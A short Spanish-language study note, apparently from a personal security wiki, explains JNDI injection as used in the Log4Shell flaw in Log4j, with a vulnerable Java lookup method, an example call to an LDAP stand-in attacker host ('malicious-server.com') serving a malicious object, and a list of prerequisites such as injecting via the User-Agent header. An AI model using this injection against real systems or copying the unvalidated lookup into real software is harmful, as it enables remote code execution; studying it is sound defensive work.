
Ataque usado en la vulnerabilidad [[Log4Shell]] de [[Log4j]]

La inyección [[JNDI]] (Java Naming and Directory Interface Injection) es una vulnerabilidad de seguridad que ocurre cuando una aplicación Java acepta entradas no confiables y las utiliza en consultas JNDI sin la debida validación o sanitización

La integración con otros servicios de directorio, unido a la ausencia de ciertos controles hace que podamos inyectar llamadas a recursos no controlados (como un servidor en nuestro poder) y que este le sirva una class maliciosa.

```java
public void lookup(String name) {
    try {
        Context ctx = new InitialContext();
        Object obj = ctx.lookup(name);
        // Uso del objeto encontrado
    } catch (NamingException e) {
        e.printStackTrace();
    }
}
```

```java
lookup("ldap://malicious-server.com:1389/evilObject");
```

## Qué es necesario para esta explotación? 

- Un servidor malicioso: Con una inyección debemos apuntar a un servidor que controlemos. Este debe tener instalador el servicio que hayamos decidido invocar mediante JNDI mediante la petición maliciosa http.
- Alterar la petición: Normalmente se usar campos como [[User-Agent]]